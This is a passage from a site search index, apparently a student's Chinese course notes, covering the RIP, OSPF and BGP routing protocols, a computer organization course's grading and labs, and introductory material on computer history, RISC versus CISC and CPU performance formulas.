\u4e2d\u6700\u5148\u5f97\u5230\u5e7f\u6cdb\u5e94\u7528\u7684\u534f\u8bae\uff0c\u5b83\u662f\u4e00\u79cd\u5206\u5e03\u5f0f\u7684\u57fa\u4e8e\u8ddd\u79bb\u5411\u91cf\u7684\u8def\u7531\u9009\u62e9\u534f\u8bae\u3002</p> <p>RIP \u4f7f\u7528\u8df3\u6570\uff08\u6216\u8ddd\u79bb\uff09\u6765\u8861\u91cf\u5230\u8fbe\u76ee\u7684\u7f51\u7edc\u7684\u8ddd\u79bb\uff0c\u89c4\u5b9a\u4ece\u4e00\u8def\u7531\u5668\u5230\u76f4\u63a5\u8fde\u63a5\u7684\u7f51\u7edc\u7684\u6761\u6570\u4e3a 1\uff0c\u6bcf\u7ecf\u8fc7\u4e00\u4e2a\u8def\u7531\u5668\uff0c\u8df3\u6570\u52a0 1\u3002\u7f51\u7edc\u4e2d\u6bcf\u4e2a\u8def\u7531\u5668\u90fd\u8981\u7ef4\u62a4\u4ece\u5b83\u81ea\u8eab\u5230\u5176\u5b83\u76ee\u7684\u7f51\u7edc\u7684\u8df3\u6570\uff0c\u5373\u8ddd\u79bb\u5411\u91cf\uff0c\u6bcf\u4e2a\u8def\u7531\u8868\u9879\u90fd\u6709\u4e09\u4e2a\u5173\u952e\u5b57\u6bb5\uff1a\u76ee\u7684\u7f51\u7edc \\(N\\)\uff0c\u8ddd\u79bb \\(d\\)\uff0c\u4e0b\u4e00\u8df3\u8def\u7531\u5668\u5730\u5740 \\(X\\)\u3002</p> <p>RIP \u5141\u8bb8\u4e00\u6761\u8def\u5f84\u4e2d\u6700\u591a\u53ea\u80fd\u5305\u542b 15 \u4e2a\u8def\u7531\u5668\uff0c\u56e0\u6b64\u8df3\u6570\u4e3a 16 \u8868\u793a\u7f51\u7edc\u4e0d\u53ef\u8fbe\uff0c\u56e0\u6b64 RIP \u53ea\u9002\u7528\u4e8e\u5c0f\u578b\u4e92\u8054\u7f51\u3002</p> <p>\u89c4\u5b9a\u6700\u9ad8\u8df3\u6570\u662f\u4e3a\u4e86\u9632\u6b62\u5206\u7ec4\u4e0d\u65ad\u5728\u73af\u8def\u4e0a\u5faa\u73af\u7684\u60c5\u51b5</p> <p>RIP \u4e2d\u6bcf\u4e2a\u8def\u7531\u5668\u90fd\u8981\u4e0d\u65ad\u548c\u5176\u5b83\u8def\u7531\u5668\u4ea4\u6362\u4fe1\u606f\uff1a</p> <ul> <li>1\uff09\u548c\u8c01\u4ea4\u6362\u4fe1\u606f\uff1a\u4ec5\u548c\u76f4\u63a5\u76f8\u90bb\u7684\u8def\u7531\u5668\u4ea4\u6362\u4fe1\u606f</li> <li>2\uff09\u4ea4\u6362\u4ec0\u4e48\u4fe1\u606f\uff1a\u4ea4\u6362\u672c\u8def\u7531\u5668\u6240\u77e5\u9053\u7684\u5168\u90e8\u4fe1\u606f\uff0c\u5373\u81ea\u5df1\u7684\u8def\u7531\u8868</li> <li>3\uff09\u4f55\u65f6\u4ea4\u6362\u4fe1\u606f\uff1a\u6309\u56fa\u5b9a\u7684\u65f6\u95f4\u95f4\u9694\uff08\u901a\u5e38\u4e3a 30s\uff09\u4ea4\u6362\u8def\u7531\u4fe1\u606f\uff1b\u5f53\u7f51\u7edc\u62d3\u6251\u53d1\u751f\u53d8\u5316\u65f6\uff0c\u8def\u7531\u5668\u4e5f\u9700\u5373\u4f7f\u5411\u76f8\u90bb\u8def\u7531\u5668\u901a\u544a\u62d3\u6251\u53d8\u5316\u540e\u7684\u8def\u7531\u4fe1\u606f</li> </ul> <p>\u8def\u7531\u5668\u521a\u542f\u52a8\u65f6\u53ea\u77e5\u9053\u81ea\u5df1\u5230\u76f4\u63a5\u76f8\u8fde\u7684\u51e0\u4e2a\u7f51\u7edc\u7684\u8ddd\u79bb\u4e3a 1\u3002\u6bcf\u4e2a\u8def\u7531\u5668\u4ec5\u548c\u76f8\u90bb\u8def\u7531\u5668\u5468\u671f\u6027\u5730\u4ea4\u6362\u5e76\u66f4\u65b0\u8def\u7531\u4fe1\u606f\uff0c\u7ecf\u8fc7\u82e5\u5e72\u6b21\u4ea4\u6362\u548c\u66f4\u65b0\u540e\uff0c\u6240\u6709\u7684\u8def\u7531\u5668\u6700\u7ec8\u90fd\u4f1a\u76f4\u5230\u5230\u8fbe\u672c AS \u5185\u4efb\u4f55\u7f51\u7edc\u7684\u6700\u77ed\u8ddd\u79bb\u548c\u4e0b\u4e00\u6761\u8def\u7531\u5668\u7684\u5730\u5740\uff0c\u79f0\u4e3a\u6536\u655b\u3002</p> <p>RIP \u7684\u66f4\u65b0\u8fc7\u7a0b</p> <p></p> <p>Open Shortest Path First, OSPF</p> <p>OSPF \u534f\u8bae\u4e5f\u662f IGP \u7684\u4e00\u79cd\uff0c\u662f\u4f7f\u7528\u5206\u5e03\u5f0f\u94fe\u8def\u72b6\u6001\u8def\u7531\u7b97\u6cd5\u7684\u5178\u578b\u4ee3\u8868\uff0c\u4e0e RIP \u76f8\u6bd4\u5177\u6709\u4ee5\u4e0b\u56db\u4e2a\u4e3b\u8981\u7279\u70b9\uff1a</p> <ul> <li>1\uff09OSPF \u4f7f\u7528\u6d2a\u6cdb\u6cd5\u5411\u672c AS \u4e2d\u7684\u6240\u6709\u8def\u7531\u5668\u53d1\u9001\u4fe1\u606f\uff0c\u800c RIP \u4ec5\u5411\u81ea\u5df1\u76f8\u90bb\u7684\u51e0\u4e2a\u8def\u7531\u5668\u53d1\u9001\u4fe1\u606f<ul> <li>\u5177\u4f53\u800c\u8a00\uff0cOSPF \u4e2d\u8def\u7531\u5668\u5411\u6240\u6709\u76f8\u90bb\u8def\u7531\u5668\u53d1\u9001\u4fe1\u606f\uff0c\u800c\u6bcf\u4e2a\u76f8\u90bb\u8def\u7531\u5668\u53c8\u5c06\u6b21\u4fe1\u606f\u53d1\u5f80\u6240\u6709\u7684\u76f8\u90bb\u8def\u7531\u5668\uff08\u9664\u4e86\u521a\u521a\u53d1\u6765\u4fe1\u606f\u7684\u90a3\u4e2a\u8def\u7531\u5668\uff09\uff0c\u6700\u7ec8\u6240\u6709\u8def\u7531\u5668\u90fd\u6536\u5230\u4e86\u8fd9\u4e2a\u4fe1\u606f\u7684\u526f\u672c</li> </ul> </li> <li>2\uff09\u53d1\u9001\u7684\u4fe1\u606f\u662f\u4e0e\u672c\u8def\u7531\u5668\u76f8\u90bb\u7684\u6240\u6709\u8def\u7531\u5668\u7684\u94fe\u8def\u72b6\u6001\uff0c\u800c RIP \u53d1\u9001\u7684\u4fe1\u606f\u662f\u6574\u4e2a\u8def\u7531\u8868</li> <li>3\uff09\u53ea\u6709\u5f53\u94fe\u8def\u72b6\u6001\u53d1\u751f\u53d8\u5316\u65f6\u624d\u4f1a\u53d1\u9001\u4fe1\u606f\uff0c\u5e76\u4e14\u6536\u655b\u66f4\u5feb\uff0c\u800c RIP \u4e0d\u7ba1\u7f51\u7edc\u62d3\u6251\u662f\u5426\u53d1\u751f\u53d8\u5316\uff0c\u4e5f\u8981\u5b9a\u671f\u4ea4\u6362\u8def\u7531\u8868\u4fe1\u606f</li> <li>4\uff09OSPF \u662f\u7f51\u7edc\u5c42\u534f\u8bae\uff0c\u76f4\u63a5\u7528 IP \u6570\u636e\u62a5\u4f20\u9001\uff0c\u800c RIP \u662f\u5e94\u7528\u5c42\u534f\u8bae\uff0c\u5b83\u5728\u4f20\u8f93\u5c42\u4f7f\u7528 UDP</li> </ul> <p>\u56e0\u4e3a\u5404\u8def\u7531\u5668\u4e4b\u95f4\u9891\u7e41\u5730\u4ea4\u4e92\u94fe\u8def\u72b6\u6001\u4fe1\u606f\uff0c\u6240\u4ee5\u6240\u6709\u8def\u7531\u5668\u6700\u7ec8\u90fd\u80fd\u5efa\u7acb\u4e00\u4e2a\u94fe\u8def\u72b6\u6001\u6570\u636e\u5e93\uff0c\u5373\u5168\u7f51\u62d3\u6251\u7ed3\u6784\u56fe\u3002\u7136\u540e\uff0c\u6bcf\u4e2a\u8def\u7531\u5668\u5229\u7528\u94fe\u8def\u72b6\u6001\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\uff0c\u4f7f\u7528 Dijkstra \u7b97\u6cd5\u8ba1\u7b97\u81ea\u5df1\u5230\u8fbe\u5404\u76ee\u7684\u7f51\u7edc\u7684\u6700\u4f18\u8def\u5f84\uff0c\u6784\u9020\u51fa\u81ea\u5df1\u7684\u8def\u7531\u8868\u3002</p> <p>\u867d\u7136\u4f7f\u7528 Dijkstra \u7b97\u6cd5\u80fd\u591f\u5f97\u5230\u5b8c\u6574\u7684\u6700\u4f18\u8def\u5f84\uff0c\u4f46\u662f\u8def\u7531\u8868\u4e2d\u4ecd\u53ea\u5b58\u50a8\u4e0b\u4e00\u8df3\u7684\u5730\u5740</p> \u9664\u6b64\u4e4b\u5916\uff0cOSPF \u8fd8\u6709\u4ee5\u4e0b\u7279\u70b9 <ul> <li>OSPF \u5141\u8bb8\u5bf9\u6bcf\u6761\u8def\u7531\u8bbe\u7f6e\u4e0d\u540c\u7684\u4ee3\u4ef7\uff0c\u5bf9\u4e8e\u4e0d\u540c\u7c7b\u578b\u7684\u4e1a\u52a1\u53ef\u8ba1\u7b97\u51fa\u4e0d\u540c\u7684\u8def\u7531</li> <li>\u82e5\u5230\u540c\u4e00\u4e2a\u76ee\u7684\u7f51\u7edc\u6709\u591a\u6761\u76f8\u540c\u4ee3\u4ef7\u7684\u8def\u5f84\uff0c\u5219\u53ef\u5c06\u901a\u4fe1\u91cf\u5206\u914d\u7ed9\u8fd9\u51e0\u4e2a\u8def\u5f84</li> <li>OSPF \u5206\u7ec4\u5177\u6709\u9274\u522b\u529f\u80fd\uff0c\u4ece\u800c\u4fdd\u8bc1\u4ec5\u5728\u53ef\u4fe1\u8d56\u7684\u8def\u7531\u5668\u4e4b\u95f4\u4ea4\u6362\u94fe\u8def\u72b6\u6001\u4fe1\u606f</li> <li>OSPF \u652f\u6301\u53ef\u53d8\u957f\u5ea6\u7684\u5b50\u7f51\u5212\u5206\u548c\u65e0\u5206\u7c7b\u7f16\u5740 CIDR</li> <li>\u6bcf\u4e2a\u94fe\u8def\u72b6\u6001\u90fd\u6709\u4e00\u4e2a 32 \u4f4d\u7684\u5e8f\u53f7\uff0c\u5e8f\u53f7\u8d8a\u5927\uff0c\u72b6\u6001\u8d8a\u65b0</li> </ul> <p>Border Gateway Protocol, BGP</p> <p>\u8fb9\u754c\u7f51\u5173\u534f\u8bae\u662f\u4e0d\u540c AS \u7684\u8def\u7531\u5668\u4e4b\u95f4\u4ea4\u6362\u8def\u7531\u4fe1\u606f\u7684\u534f\u8bae\uff0c\u5c5e\u4e8e EGP\u3002</p> <p>BGP \u662f\u57fa\u4e8e TCP \u7684\u5e94\u7528\u5c42\u534f\u8bae\uff0c\u91c7\u7528\u4e86\u8def\u5f84\u5411\u91cf\u8def\u7531\u9009\u62e9\uff0c\u76ee\u7684\u662f\u529b\u6c42\u5bfb\u627e\u4e00\u6761\u80fd\u591f\u5230\u8fbe\u76ee\u7684\u7f51\u7edc\u4e14\u6bd4\u8f83\u597d\u7684\u8def\u7531\uff08\u5e76\u4e0d\u4e00\u5b9a\u662f\u6700\u4f73\u8def\u7531\uff09\u3002</p> <p>BGP \u4e0d\u4ec5\u8fd0\u884c\u5728 AS \u4e4b\u95f4\uff0c\u8fd8\u8fd0\u884c\u5728 AS \u5185\u90e8\uff0c\u6839\u636e BGP \u8def\u7531\u4fe1\u606f\u4ea4\u6362\u7684\u5bf9\u7b49\u53cc\u65b9\u7c7b\u578b\uff0c\u6211\u4eec\u6709\u4ee5\u4e0b\u4e24\u79cd\u4f1a\u8bdd\u5206\u7c7b\uff1a</p> <ul> <li>external BGP, eBGP: \u8de8\u8d8a\u4e24\u4e2a AS \u7684 BGP \u4f1a\u8bdd\u79f0\u4e3a eBGP\uff0c\u7528\u4e8e\u4ece\u76f8\u90bb AS \u83b7\u5f97\u7f51\u7edc\u53ef\u8fbe\u4fe1\u606f</li> <li>internal BGP, iBGP: \u540c\u4e00 AS \u5185\u90e8\u4e24\u4e2a\u8def\u7531\u5668\u95f4\u7684 BGP \u4f1a\u8bdd\u79f0\u4e3a iBGP\uff0c\u7528\u4e8e\u5c06\u7f51\u7edc\u53ef\u8fbe\u4fe1\u606f\u4f20\u64ad\u7ed9 AS \u5185\u7684\u8def\u7531\u5668</li> </ul> <p>BGP \u4e2d\u6700\u91cd\u8981\u7684\u4e24\u4e2a\u5c5e\u6027\u4e3a AS-PATH \u548c NEXT-HOP\uff0c\u8def\u7531\u5668\u901a\u8fc7 BGP \u62a5\u6587\u5b66\u4e60\u5230\u67d0\u4e00\u7ec8\u70b9\u6240\u9700\u7ecf\u8fc7\u7684\u8def\u5f84\uff1a</p> <p></p> <p>\u4f8b\u5982\uff0c\u5bf9\u4e8e\u5982\u4e0a\u4f8b\u5b50\uff0c\u8fb9\u9645\u8def\u7531\u5668 R1a \u4ece R2a \u6536\u5230\u62a5\u6587 <code>C, AS2, AS3, R2a</code>\uff0c\u5b83\u7684\u542b\u4e49\u662f\u201c\u4ece R2a \u51fa\u53d1\u80fd\u591f\u5230\u8fbe AS2-&gt;AS3 \u4e2d\u7684\u7f51\u7edc C\u201d\uff0c\u5373 \\(R1a\\rightarrow R2a \\rightarrow ... \\rightarrow C\\)\u3002</p> <p>\u800c\u5bf9\u4e8e\u7f51\u7edc \\(A\\)\uff0c\u5b83\u4f1a\u6536\u5230 iBGP \u62a5\u6587 <code>C, AS2, AS3, R1a</code>\uff0c\u8868\u793a\u5b83\u8981\u5230\u8fbe\u7f51\u7edc \\(C\\) \u9700\u8981\u5c06\u5206\u7ec4\u8f6c\u53d1\u5230\u540c\u4e00 AS \u5185\u90e8\u7684\u8def\u7531\u5668 R1a \u4e0a\u3002\u6b64\u65f6\u9700\u8981\u6839\u636e\u5185\u90e8\u7f51\u5173\u534f\u8bae\u627e\u5230\u4ece\u7f51\u7edc \\(A\\) \u5230\u8fbe R1a \u7684\u6700\u4f73\u8def\u7531\u7684\u4e0b\u4e00\u8df3\u5e76\u8f6c\u53d1\uff0c\u800c\u5e76\u4e0d\u4e00\u5b9a\u662f\u76f4\u63a5\u8f6c\u53d1\u5230 R1a\u3002</p> <p>\u5f53 BGP \u521a\u521a\u8fd0\u884c\u65f6\uff0cBGP \u7684\u90bb\u7ad9\u8981\u4ea4\u6362\u6574\u4e2a\u7684 BGP \u8def\u7531\u8868\uff1b\u4ee5\u540e\u53ea\u9700\u8981\u5728\u53d1\u751f\u53d8\u5316\u65f6\u66f4\u65b0\u6709\u53d8\u5316\u7684\u90e8\u5206\u3002</p> <p>BGP \u62a5\u6587\u901a\u5e38\u901a\u8fc7\u534a\u6c38\u4e45\u7aef\u53e3 179 \u8fdb\u884c\u4ea4\u6362\uff0c\u5305\u62ec\u4ee5\u4e0b\u56db\u7c7b\uff1a</p> <ul> <li>Open \u62a5\u6587: \u7528\u4e8e\u4e0e\u76f8\u90bb BGP \u5bf9\u7b49\u65b9\u5efa\u7acb\u5173\u7cfb\uff0c\u4f7f\u901a\u4fe1\u521d\u59cb\u5316<ul> <li>\u4e24\u4e2a\u8def\u7531\u5668\u5efa\u7acb TCP \u8fde\u63a5\u540e\u5fc5\u987b\u53d1\u9001 Open \u62a5\u6587\uff0c\u4ee5\u76f8\u4e92\u8bc6\u522b\u5bf9\u65b9\uff0c\u5e76\u534f\u5546\u4e00\u4e9b\u53c2\u6570</li> </ul> </li> <li>Update \u62a5\u6587: \u7528\u4e8e\u901a\u77e5\u67d0\u4e00\u8def\u7531\u7684\u4fe1\u606f\uff0c\u4ee5\u53ca\u5217\u51fa\u8981\u64a4\u9500\u7684\u591a\u6761\u8def\u7531<ul> <li>\u64a4\u9500\u8def\u7531\u53ef\u4ee5\u4e00\u6b21\u64a4\u9500\u591a\u6761\uff0c\u4f46\u65b0\u589e\u8def\u7531\u53ea\u80fd\u4e00\u6b21\u589e\u52a0\u4e00\u6761</li> </ul> </li> <li>Keepalive \u62a5\u6587: \u7528\u4e8e\u5468\u671f\u6027\u5730\u8bc1\u5b9e\u90bb\u7ad9\u7684\u8fde\u901a\u6027<ul> <li>\u9664\u6b64\u4e4b\u5916\uff0c\u6536\u5230 Open \u62a5\u6587\u7684\u8def\u7531\u5668\u8981\u53d1\u56de Keepalive \u62a5\u6587\u8868\u793a\u63a5\u53d7\u5efa\u7acb BGP \u8fde\u63a5</li> </ul> </li> <li>Notification \u62a5\u6587: \u7528\u6765\u53d1\u9001\u68c0\u6d4b\u5230\u7684\u5dee\u9519</li> </ul>"},{"location":"Courses/CN/Topic3/#_12","title":"\u62e5\u585e\u63a7\u5236\u7b97\u6cd5","text":""},{"location":"Courses/CN/Topic4/","title":"\u4f20\u8f93\u5c42","text":""},{"location":"Courses/CN/Topic4/#_1","title":"\u4f20\u8f93\u5c42","text":"<p> \u7ea6 3 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"Courses/CO/","title":"Computer Organization","text":""},{"location":"Courses/CO/#computer-organization","title":"Computer Organization","text":"<p> \u7ea6 172 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"},{"location":"Courses/CO/#_1","title":"\u5206\u6570\u6784\u6210","text":"<ul> <li>\u5e73\u65f6\u5206 20%</li> <li>\u5b9e\u9a8c 30%<ul> <li>Lab 0~3\uff1a\u57fa\u672c\u5b9e\u9a8c 30%</li> <li>Lab 4\uff1a\u5355\u5468\u671fCPU 30%</li> <li>Lab 5\uff1a\u6d41\u6c34\u7ebfCPU 40%</li> <li>\u4f18\u79c0\u4f5c\u54c1\u9644\u52a0\u5206</li> </ul> </li> <li>\u671f\u4e2d\u8003\u8bd5 10%</li> <li>\u671f\u672b\u8003\u8bd5 40%</li> </ul> <p>rvcodec.js \u00b7 RISC-V Instruction Encoder/Decoder</p>"},{"location":"Courses/CO/#_2","title":"\u5b9e\u9a8c\u5907\u6ce8","text":"\u5b9e\u9a8c\u5b89\u6392 <p>\u677f\u5b50\u578b\u53f7\u9009\u62e9 <code>xc7a100tcsg324-1</code></p> <p></p>"},{"location":"Courses/CO/#_3","title":"\u603b\u7ed3","text":"<p>\u610f\u60f3\u4e0d\u5230\u7684\u6700\u9ad8\u5206\uff01\uff1f\u8fd9\u95e8\u8bfe\u603b\u4e4b\u5c31\u662f\u8003\u7684\u8303\u56f4\u6bd4\u8f83\u5e7f\uff0c\u4f46\u662f\u90fd\u4e0d\u4f1a\u592a\u96be\u592a\u6df1\u5165\u7684\u3002</p> <p>\u987a\u4fbf\u5206\u4eab\u4e00\u4e0b\u5f53\u65f6\u505a\u7684 A4 \u7eb8\u5427\uff0c\u6284\u4e86\u4e00\u4e9b\u6848\u4f8b\u548c\u9898\u76ee\u4e0a\u53bb\uff0c\u4f46\u662f\u6211\u8fd9\u6b21\u8003\u8bd5\u57fa\u672c\u6ca1\u8003\u5230\u6211\u6284\u7684\u8fd9\u4e9b\uff1a</p> <p></p>"},{"location":"Courses/CO/#reference","title":"Reference","text":"<ul> <li>\u54b8\u9c7c\u55a7\u7684\u4ee3\u7801\u7a7a\u95f4</li> </ul>"},{"location":"Courses/CO/Chapter1/","title":"CH 1. \u8ba1\u7b97\u673a\u6982\u5ff5\u4e0e\u6280\u672f","text":""},{"location":"Courses/CO/Chapter1/#chapter-1-computer-abstractions-and-technology","title":"Chapter 1. Computer Abstractions and Technology","text":"<p> \u7ea6 1120 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>\u8be5\u7ae0\u5927\u90e8\u5206\u5185\u5bb9\u90fd\u4ec5\u4f5c\u4e86\u89e3\uff0c\u5728\u540e\u7eed\u7ae0\u8282\u4f1a\u66f4\u6df1\u5165\u8bb2\u89e3 (\u53ea\u9700\u6ce8\u610f CPU \u7684\u6027\u80fd)</p>"},{"location":"Courses/CO/Chapter1/#introduction","title":"Introduction","text":"<p>\u5728 Pre-computer \u65f6\u671f\uff0c\u8ba1\u6570\u624b\u6bb5\u57fa\u672c\u90fd\u662f Non-electrical, non-programmable (\u975e\u7535\u5b50\uff0c\u4e0d\u53ef\u7f16\u7a0b) \u7684</p> <p>\u5bf9\u8ba1\u7b97\u673a\u53d1\u5c55\u5f71\u54cd\u5de8\u5927\u7684\u8fed\u4ee3\u57fa\u672c\u53ef\u4ee5\u6982\u62ec\u4e3a\u5982\u4e0b\u9636\u6bb5\uff1a</p> <ul> <li>First Generation - 1946 ~ 1956<ul> <li>\u7535\u5b50\u7ba1(\u4ea6\u79f0\u771f\u7a7a\u7ba1)\uff0c\u53ef\u7f16\u7a0b\uff0c\u56fe\u7075\u5b8c\u5168</li> <li>\u7b2c\u4e00\u53f0\u901a\u7528\u8ba1\u7b97\u673a ENIAC in 1946<ul> <li>\u901a\u7528\u6307\u4ee4\u96c6\u3001\u5341\u8fdb\u5236\u3001\u53ef\u7f16\u7a0b\u3001\u56fe\u7075\u5b8c\u5168</li> <li>\u6ca1\u6709\u7a0b\u5e8f\u5b58\u50a8\u80fd\u529b</li> </ul> </li> </ul> </li> <li>Second Generation - 1956 ~ 1964<ul> <li>\u6676\u4f53\u7ba1\uff0c\u7f16\u7a0b\u8bed\u8a00\u5f00\u59cb\u5e94\u7528</li> <li>IBM 1401 in 1959<ul> <li>\u53ef\u53d8\u5b57\u957f\u3001\u5341\u8fdb\u5236</li> </ul> </li> </ul> </li> <li>Third Generation - 1964 ~ 1971<ul> <li>\u96c6\u6210\u7535\u8def(IC)\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5f00\u59cb\u5e94\u7528</li> </ul> </li> <li>Fourth Generation - 1971 ~ now<ul> <li>\u5927\u89c4\u6a21\u5fae\u5904\u7406\u5668(Microprocessor)\uff0c\u56fe\u5f62\u7528\u6237\u754c\u9762\uff0c\u4e2a\u4eba\u7535\u8111\u5174\u8d77</li> <li>Mac OS with GUI in 1984</li> <li>Windows 1.0 in 1985</li> </ul> </li> </ul> <p>von Neumann architecture (1945)</p> <ul> <li>\u8ba1\u7b97\u4e0e\u5b58\u50a8\u5206\u79bb</li> <li>\u6570\u636e\u548c\u6307\u4ee4\u4fdd\u5b58\u5728\u540c\u4e00\u4e2a\u5b58\u50a8\u5668</li> <li>\u91c7\u7528\u6307\u4ee4\u96c6\u6784\u9020</li> </ul> <p></p> <p>\u6307\u4ee4\u96c6\u4e3b\u8981\u5206\u4e3a\u4e24\u7c7b\uff1a</p> <ul> <li>RISC: Reduced Instruction Set Computer\uff0c\u4f8b\u5982 ARM,MIPS,RISC-V \u7b49\u3002</li> <li>CISC: Complex Instruction Set Computer\uff0c\u4f8b\u5982 x86</li> </ul> <p>RISC-V\u7684\u4f18\u52bf</p> <p>\u7cbe\u7b80\u6307\u4ee4\u96c6\u5bf9\u6307\u4ee4\u6570\u76ee\u548c\u5bfb\u5740\u65b9\u5f0f\u90fd\u8fdb\u884c\u4e86\u7cbe\u7b80\uff0c\u4f7f\u5176\u6267\u884c\u66f4\u5bb9\u6613\uff0c\u6307\u4ee4\u5e76\u884c\u6267\u884c\u7a0b\u5ea6\u66f4\u597d\uff0c\u7f16\u8bd1\u5668\u6548\u7387\u66f4\u9ad8\u3002\u4f8b\u5982\uff0c\u7cbe\u7b80\u6307\u4ee4\u96c6\u7684\u6307\u4ee4\u7f16\u7801\u957f\u5ea6\u4e3a\u5b9a\u957f\uff0c\u66f4\u65b9\u4fbf\u4e86\u53d6\u6307\u3002</p> <p>\u73b0\u5728\u7edd\u5927\u90e8\u5206\u82af\u7247\u5747\u91c7\u7528 RISC \u67b6\u6784\uff0c\u5305\u62ec ARM \u82af\u7247\u3001\u667a\u80fd\u624b\u673a\uff0c\u6211\u4eec\u8bfe\u4e0a\u9700\u8981\u4e86\u89e3\u7684\u5373 RISC-V 321 \u6307\u4ee4\u96c6</p>"},{"location":"Courses/CO/Chapter1/#computer-organization","title":"Computer Organization","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a iPad \uff0c\u5176\u4e3b\u677f\u6784\u9020\u5982\u4e0b\uff1a</p> <p></p> <p>\u5173\u4e8e\u5185\u5b58\uff0c\u53ef\u4ee5\u53c2\u7167 \u6211\u5728 CSAPP \u5185\u7684\u76f8\u5173\u7b14\u8bb0 </p> <p>\u4e00\u4e2a\u7a0b\u5e8f\u7684\u6267\u884c\u5230\u8fbe\u786c\u4ef6\uff0c\u9700\u8981\u7ecf\u8fc7 \u9ad8\u7ea7\u7f16\u7a0b\u8bed\u8a00 \u2192 \u6c47\u7f16\u8bed\u8a00 \u2192 \u673a\u5668\u8bed\u8a00</p> <p>\u800c\u6307\u4ee4\u96c6\u53ef\u4ee5\u770b\u4f5c\u786c\u4ef6\u548c\u6700\u5e95\u5c42\u8f6f\u4ef6\u7684\u63a5\u53e3\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p>"},{"location":"Courses/CO/Chapter1/#how-to-build-processor","title":"How to build processor","text":"<p>\u6469\u5c14\u5b9a\u5f8b</p> <p>\u6bcf\u9694 18-24 \u4e2a\u6708\uff0c\u96c6\u6210\u7535\u8def\u4e0a\u53ef\u5bb9\u7eb3\u7684\u5143\u5668\u4ef6\u7684\u6570\u76ee\u4fbf\u4f1a\u589e\u52a0\u4e00\u500d\uff0c\u6027\u80fd\u4e5f\u5c06\u63d0\u5347\u4e00\u500d</p> <p>\u76ee\u524d\u96c6\u6210\u82af\u7247\u5236\u9020\u9762\u4e34\u7684\u4e3b\u8981\u56f0\u96be\u4e3a\uff1a</p> <ul> <li>\u96c6\u6210\u5ea6\u8d8a\u6765\u8d8a\u9ad8\uff0c\u590d\u6742\u5ea6\u5feb\u901f\u589e\u52a0</li> <li>\u5de5\u827a\u5c3a\u5bf8\u8fbe\u5230\u7269\u7406\u6781\u9650\uff0c\u52a0\u5de5\u7cbe\u5ea6\u8d8a\u6765\u8d8a\u9ad8\uff0c\u5236\u9020\u96be\u5ea6\u8d8a\u6765\u8d8a\u5927</li> <li>\u591a\u4e2a\u6280\u672f\u7684\u96c6\u6210\uff1a\u7535\u5b50\uff0c\u5149\u5b66\uff0c\u673a\u68b0\uff0c\u8ba1\u7b97\u673a\uff0c\u6bcf\u4e00\u4e2a\u6280\u672f\u90fd\u80fd\u96be\u7a81\u7834</li> </ul> <p>\u800c\u5904\u7406\u5668\u9762\u4e34\u7684\u56f0\u5883\u4e3a\uff1a</p> <ul> <li>\u5904\u7406\u5668\u548c\u5b58\u50a8\u5668\u6027\u80fd\u7684\u63d0\u9ad8\u4e0d\u6210\u6bd4\u4f8b\uff0c\u201c\u5185\u5b58\u5899\u201d\u95ee\u9898\u65e5\u8d8b\u4e25\u91cd\uff0c\u201c\u51af\u8bfa\u4f9d\u66fc\u201d\u67b6\u6784\u9762\u9886\u6311\u6218</li> <li>\u5355\u4f4d\u9762\u79ef\u529f\u8017\u589e\u5927\uff0c\u6563\u70ed\u95ee\u9898\u65e5\u8d8b\u4e25\u5cfb\uff0c\u201c\u529f\u8017\u5899\u201d\u95ee\u9898\u51f8\u663e</li> <li>\u53d7\u7269\u7406\u89c4\u5f8b\u9650\u5236\uff0c\u6469\u5c14\u5b9a\u5f8b\u9762\u4e34\u5931\u6548\uff0c\u9760\u5de5\u827a\u8fdb\u6b65\u83b7\u5f97\u7684\u6027\u80fd\u7ea2\u5229\u9010\u6e10\u51cf\u5f31</li> </ul>"},{"location":"Courses/CO/Chapter1/#performance-and-idea","title":"Performance and Idea","text":"<p>\u8ba1\u7b97\u673a\u7684\u6027\u80fd\u4e00\u822c\u7531\u4ee5\u4e0b\u4e24\u70b9\u8861\u91cf\uff1a</p> <ul> <li>Response Time / Execution Time\u00a0\u54cd\u5e94\u65f6\u95f4/\u6267\u884c\u65f6\u95f4<ul> <li>\u6267\u884c\u4efb\u52a1\u6240\u9700\u7684\u65f6\u95f4</li> </ul> </li> <li>Throughput / Bandwidth \u541e\u5410\u7387<ul> <li>\u5355\u4f4d\u65f6\u95f4\u5185\u5b8c\u6210\u7684\u603b\u4efb\u52a1\u91cf</li> </ul> </li> </ul> <p>\u4e00\u822c\u5730\uff0c\u6211\u4eec\u5c06\u8ba1\u7b97\u673a\u7684 Performance \u5b9a\u4e49\u4e3a\uff1a</p> \\[ Performance = \\frac{1}{Execution\\ Time} \\] <p>\u8fd9\u91cc\u7684 Execution Time \u53ef\u4ee5\u6709\u4e24\u79cd\u6982\u5ff5\uff0c\u4e00\u662f\u8be5\u4efb\u52a1\u7684\u603b\u8fd0\u884c\u65f6\u95f4\uff0c\u82f1\u6587\u4e3a Elapsed Time \uff0c\u5305\u62ec\u5904\u7406\u65f6\u95f4\u3001I/O \u5ef6\u8fdf\u3001\u64cd\u4f5c\u7cfb\u7edf\u54cd\u5e94\u65f6\u95f4\u3001idle time \u7b49\uff1b\u53e6\u4e00\u7c7b\u662f CPU Time \uff1a</p> <ul> <li>CPU clock cycle \u65f6\u949f\u5468\u671f\u6570</li> <li>clock rate \u65f6\u949f\u9891\u7387</li> <li>clock cycle time \u65f6\u949f\u5468\u671f\u957f\u5ea6</li> </ul> <p>\u90a3\u4e48 CPU Time \u5373\u4e3a\uff1a</p> \\[ CPU\\ Time =CPU\\ Clock\\ Cycles \\times Clock\\ Cycle\\ Time=\\frac{CPU\\ Clock\\ Cycles}{Clock\\ Rate}  \\] <p>\u53c8\u5f88\u5bb9\u6613\u60f3\u5230 \\(Clock\\ Cycles=Instruction\\ Count\\times Cycles\\ per\\ Instruction\\) (CPI)</p> 